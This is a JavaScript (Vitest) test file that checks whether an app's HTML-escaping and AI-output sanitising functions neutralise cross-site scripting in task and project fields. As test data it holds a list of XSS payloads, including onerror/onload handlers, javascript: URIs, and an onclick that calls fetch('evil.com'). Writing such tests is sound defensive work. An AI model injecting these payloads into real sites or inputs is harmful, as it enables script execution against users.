import { describe, it, expect } from 'vitest';
import { esc, sanitizeAIHTML } from '../utils.js';
import { createTask, createProject } from '../app.js';

// ============================================================
// Security tests — XSS prevention, input sanitization, and
// safe rendering of user-supplied content
// ============================================================

describe('esc() XSS prevention', () => {
  it('escapes basic script tag', () => {
    const result = esc('<script>alert("xss")</script>');
    expect(result).not.toContain('<script>');
    expect(result).toContain('&lt;script&gt;');
  });

  it('escapes script tag with src attribute', () => {
    const result = esc('<script src="evil.js"></script>');
    expect(result).not.toContain('<script');
    expect(result).toContain('&lt;script');
  });

  it('escapes img onerror handler', () => {
    const result = esc('<img src=x onerror="alert(1)">');
    expect(result).not.toContain('<img');
    expect(result).toContain('&lt;img');
  });

  it('escapes svg onload handler', () => {
    const result = esc('<svg onload="alert(1)">');
    expect(result).not.toContain('<svg');
    expect(result).toContain('&lt;svg');
  });

  it('escapes iframe injection', () => {
    const result = esc('<iframe src="javascript:alert(1)"></iframe>');
    expect(result).not.toContain('<iframe');
    expect(result).toContain('&lt;iframe');
  });

  it('escapes javascript: protocol in links', () => {
    const result = esc('<a href="javascript:alert(1)">click</a>');
    expect(result).not.toContain('<a href');
    expect(result).toContain('&lt;a');
  });

  it('escapes double quotes to prevent attribute breakout', () => {
    const result = esc('" onmouseover="alert(1)" data-x="');
    expect(result).not.toContain('" onmouseover');
    expect(result).toContain('&quot;');
  });

  it('escapes single quotes to prevent attribute breakout', () => {
    const result = esc("' onmouseover='alert(1)' data-x='");
    expect(result).not.toContain("' onmouseover");
    expect(result).toContain('&#39;');
  });

  it('escapes backticks to prevent template literal injection', () => {
    const result = esc('`${alert(1)}`');
    expect(result).not.toContain('`');
    expect(result).toContain('&#96;');
  });

  it('escapes nested script tags', () => {
    const result = esc('<<script>script>alert(1)<</script>/script>');
    expect(result).not.toContain('<script>');
  });

  it('escapes HTML entities used in URLs', () => {
    const result = esc('http://evil.com?a=1&b=2');
    expect(result).toContain('&amp;b=2');
  });

  it('handles string with only special chars', () => {
    const result = esc('<>&"\'`');
    expect(result).toBe('&lt;&gt;&amp;&quot;&#39;&#96;');
  });

  it('preserves safe text content', () => {
    expect(esc('Hello, world!')).toBe('Hello, world!');
  });

  it('handles empty string', () => {
    expect(esc('')).toBe('');
  });

  it('converts numbers to strings safely', () => {
    expect(esc(42)).toBe('42');
    expect(esc(0)).toBe('0');
  });
});

describe('sanitizeAIHTML() strips dangerous content', () => {
  it('strips script tags but preserves text content', () => {
    const result = sanitizeAIHTML('<script>alert(1)</script>Hello');
    expect(result).not.toContain('<script>');
    expect(result).toContain('Hello');
  });

  it('escapes event handler attributes so they are inert text', () => {
    const result = sanitizeAIHTML('<div onmouseover="alert(1)">text</div>');
    // The entire tag is escaped — no active <div> element
    expect(result).not.toContain('<div');
    expect(result).toContain('&lt;div');
  });

  it('strips style tags', () => {
    const result = sanitizeAIHTML('<style>body{display:none}</style>text');
    expect(result).not.toContain('<style>');
    expect(result).toContain('text');
  });

  it('preserves bold markdown', () => {
    const result = sanitizeAIHTML('This is **bold** text');
    expect(result).toContain('<strong>bold</strong>');
  });

  it('preserves italic markdown', () => {
    const result = sanitizeAIHTML('This is *italic* text');
    expect(result).toContain('<em>italic</em>');
  });

  it('converts newlines to br tags', () => {
    const result = sanitizeAIHTML('Line 1\nLine 2\nLine 3');
    expect(result).toBe('Line 1<br>Line 2<br>Line 3');
  });

  it('strips data: URIs in attributes', () => {
    const result = sanitizeAIHTML('<img src="data:text/html,<script>alert(1)</script>">');
    expect(result).not.toContain('<img');
    expect(result).toContain('&lt;img');
  });

  it('strips form tags', () => {
    const result = sanitizeAIHTML('<form action="evil.com"><input></form>');
    expect(result).not.toContain('<form');
    expect(result).toContain('&lt;form');
  });

  it('handles null input', () => {
    expect(sanitizeAIHTML(null)).toBe('');
  });

  it('handles undefined input', () => {
    expect(sanitizeAIHTML(undefined)).toBe('');
  });

  it('handles number input', () => {
    expect(sanitizeAIHTML(42)).toBe('42');
  });

  it('handles bold with nested dangerous content', () => {
    const result = sanitizeAIHTML('**<img src=x onerror=alert(1)>**');
    expect(result).not.toContain('<img');
    expect(result).toContain('<strong>');
  });

  it('handles mixed markdown and HTML', () => {
    const result = sanitizeAIHTML('**bold** and <b>html bold</b>');
    expect(result).toContain('<strong>bold</strong>');
    expect(result).not.toContain('<b>');
    expect(result).toContain('&lt;b&gt;');
  });
});

describe('task titles with HTML entities are escaped', () => {
  it('createTask preserves raw HTML in title (for later escaping at render)', () => {
    const t = createTask({ title: '<b>Bold Task</b>' });
    expect(t.title).toBe('<b>Bold Task</b>');
    // When rendered, esc() should escape it
    expect(esc(t.title)).not.toContain('<b>');
    expect(esc(t.title)).toContain('&lt;b&gt;');
  });

  it('task title with script tag is neutralized by esc()', () => {
    const t = createTask({ title: '<script>alert("xss")</script>' });
    const escaped = esc(t.title);
    expect(escaped).not.toContain('<script>');
    expect(escaped).toContain('&lt;script&gt;');
  });

  it('task title with HTML entities passes through correctly', () => {
    const t = createTask({ title: 'Fix &amp; update' });
    const escaped = esc(t.title);
    // & in the original gets double-escaped: &amp; -> &amp;amp;
    expect(escaped).toContain('&amp;amp;');
  });

  it('task notes with multi-line XSS attempt are escaped', () => {
    const t = createTask({
      notes: 'Normal text\n<script>\nalert("xss")\n</script>\nMore text',
    });
    const escaped = esc(t.notes);
    expect(escaped).not.toContain('<script>');
  });
});

describe('project names with special characters', () => {
  it('project name with angle brackets is safe after escaping', () => {
    const p = createProject({ name: '<script>alert(1)</script>' });
    const escaped = esc(p.name);
    expect(escaped).not.toContain('<script>');
    expect(escaped).toContain('&lt;script&gt;');
  });

  it('project name with quotes is safe after escaping', () => {
    const p = createProject({ name: 'Project "Alpha" & \'Beta\'' });
    const escaped = esc(p.name);
    expect(escaped).toContain('&quot;');
    expect(escaped).toContain('&#39;');
    expect(escaped).toContain('&amp;');
  });

  it('project name with backticks is safe after escaping', () => {
    const p = createProject({ name: 'Project `eval`' });
    const escaped = esc(p.name);
    expect(escaped).toContain('&#96;');
    expect(escaped).not.toContain('`');
  });

  it('project description with HTML is safe after escaping', () => {
    const p = createProject({ description: '<img src=x onerror=alert(1)>' });
    const escaped = esc(p.description);
    expect(escaped).not.toContain('<img');
  });
});

describe('CSP-related edge cases', () => {
  it('esc makes inline event handlers inert by escaping the tag', () => {
    const payload = '<div onclick="fetch(\'evil.com\')">Click me</div>';
    const escaped = esc(payload);
    // The < and > are escaped, so no active HTML element is created
    expect(escaped).not.toContain('<div');
    expect(escaped).toContain('&lt;div');
  });

  it('esc makes javascript: URIs inert by escaping the tag', () => {
    const payload = '<a href="javascript:void(0)">link</a>';
    const escaped = esc(payload);
    // No active <a> tag — the angle brackets are escaped
    expect(escaped).not.toContain('<a ');
    expect(escaped).toContain('&lt;a');
  });

  it('sanitizeAIHTML does not produce executable script content', () => {
    const payloads = [
      '<script>alert(1)</script>',
      '<img src=x onerror=alert(1)>',
      '<svg/onload=alert(1)>',
      '<body onload=alert(1)>',
      '<input onfocus=alert(1) autofocus>',
      '<marquee onstart=alert(1)>',
      '<details open ontoggle=alert(1)>',
    ];
    for (const payload of payloads) {
      const result = sanitizeAIHTML(payload);
      // None should contain unescaped HTML tags
      expect(result).not.toMatch(/<[a-z]/i);
    }
  });

  it('multiple encoding attempts do not bypass escaping', () => {
    // Double-encoding attempt
    const payload = '&lt;script&gt;alert(1)&lt;/script&gt;';
    const result = esc(payload);
    // The & in &lt; gets escaped to &amp;lt; — still safe
    expect(result).not.toContain('<script>');
  });
});
